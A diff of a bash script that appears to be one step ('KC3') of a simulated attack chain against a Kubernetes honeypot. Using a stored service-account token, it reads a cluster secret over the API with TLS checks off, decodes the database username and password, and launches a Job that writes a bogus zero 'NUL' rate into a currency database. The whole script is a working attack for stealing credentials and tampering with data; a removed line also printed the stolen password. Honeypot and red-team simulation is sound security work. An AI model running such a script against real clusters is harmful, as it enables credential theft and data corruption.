@@ -28,22 +28,28 @@ JOB_NAME="insert-currency-rate-$(date +%Y%m%d%H%M%S)"
 PGHOST="postgres.$NSDATA.svc.cluster.local"
 PGPORT="5432"
 PGDATABASE="currency"
-SQL_STMT="INSERT INTO currency (code, rate) VALUES ('NUL', 0);"
+SQL_STMT="INSERT INTO currency (code, rate) VALUES ('NUL', 0) ON CONFLICT (code) DO UPDATE SET rate = EXCLUDED.rate;"
 TOKEN="$(cat $DATA_PATH/KC3/tokenCurrency)"
+USER_FILE="$DATA_PATH/KC3/dbcurrency-user"
+PASS_FILE="$DATA_PATH/KC3/dbcurrency-pass"
 
 # Installing dependencies and setup
 require_tools curl jq base64
 mkdir -p "$DATA_PATH/KC3"
 
-echo ">> Reading ${SECRET} in namespace ${NS}..."
-SECRET_JSON=$(curl -sk \
-  --header "Authorization: Bearer $TOKEN" \
-  $API_SERVER/api/v1/namespaces/$NS/secrets/$SECRET)
-# Extraction credentials
-USER="$(jq -r '.data.username' <<<"$SECRET_JSON" | base64 -d)"
-PASS="$(jq -r '.data.password' <<<"$SECRET_JSON" | base64 -d)"
+if [[ -s "$USER_FILE" && -s "$PASS_FILE" ]]; then
+  USER="$(cat "$USER_FILE")"
+  PASS="$(cat "$PASS_FILE")"
+else
+  echo "[KC3-308] credential artifacts missing, reading ${NS}/${SECRET} as compatibility fallback"
+  SECRET_JSON=$(curl -sk \
+    --header "Authorization: Bearer $TOKEN" \
+    $API_SERVER/api/v1/namespaces/$NS/secrets/$SECRET)
+  USER="$(jq -r '.data.username' <<<"$SECRET_JSON" | base64 -d)"
+  PASS="$(jq -r '.data.password' <<<"$SECRET_JSON" | base64 -d)"
+fi
 
-echo ">> Credenzials extracted (username/password $USER - $PASS)."
+echo "[KC3-308] using recovered database credentials for user ${USER}"
 
 JOB_JSON="$(
   jq -n \
@@ -61,7 +67,10 @@ JOB_JSON="$(
   metadata: {
     name: $name,
     namespace: $ns,
-    labels: { "app.kubernetes.io/name": "insert-currency-rate" }
+    labels: {
+      "app.kubernetes.io/name": "insert-currency-rate",
+      "honeypot.attack.kc": "KC3"
+    }
   },
   spec: {
     backoffLimit: 0,
@@ -96,9 +105,9 @@ JOB_JSON="$(
 
 MANIFEST_FILE="$DATA_PATH/KC3/$JOB_NAME.json"
 printf '%s\n' "$JOB_JSON" > "$MANIFEST_FILE"
-echo ">> Manifest saved in ${MANIFEST_FILE}"
+echo "[KC3-308] job manifest saved in ${MANIFEST_FILE}"
 
-echo ">> Creating Job ${JOB_NAME} in namespace ${NS}..."
+echo "[KC3-308] creating Job ${NS}/${JOB_NAME}"
 CREATE_RESP="$(
   curl -sSk -X POST \
     --header "Authorization: Bearer ${TOKEN}" \
@@ -108,9 +117,31 @@ CREATE_RESP="$(
 )"
 
 if echo "$CREATE_RESP" | jq -e '.kind=="Job"' >/dev/null 2>&1; then
-  echo "Job created: ${JOB_NAME}"
+  echo "[KC3-308] job created"
 else
-  echo "Error creating the Job. API answer:"
+  echo "[KC3-308] error creating the Job. API answer:"
   echo "$CREATE_RESP" | jq .
   exit 1
 fi
+
+echo "[KC3-308] waiting for Job ${JOB_NAME} to complete"
+deadline=$((SECONDS + ${JOB_WAIT_TIMEOUT_SECONDS:-180}))
+while (( SECONDS < deadline )); do
+  JOB_JSON="$(curl -sSk \
+    --header "Authorization: Bearer ${TOKEN}" \
+    "${API_SERVER}/apis/batch/v1/namespaces/${NS}/jobs/${JOB_NAME}")"
+  if echo "$JOB_JSON" | jq -e '.status.conditions[]? | select(.type=="Complete" and .status=="True")' >/dev/null 2>&1; then
+    printf '%s\n' "$JOB_NAME" > "$DATA_PATH/KC3/currency-rate-inserted"
+    echo "[KC3-308] job completed; NUL currency rate inserted"
+    exit 0
+  fi
+  if echo "$JOB_JSON" | jq -e '.status.conditions[]? | select(.type=="Failed" and .status=="True")' >/dev/null 2>&1; then
+    echo "Job failed: ${JOB_NAME}" >&2
+    echo "$JOB_JSON" | jq . >&2
+    exit 1
+  fi
+  sleep 3
+done
+
+echo "Timed out waiting for Job ${JOB_NAME} completion" >&2
+exit 1
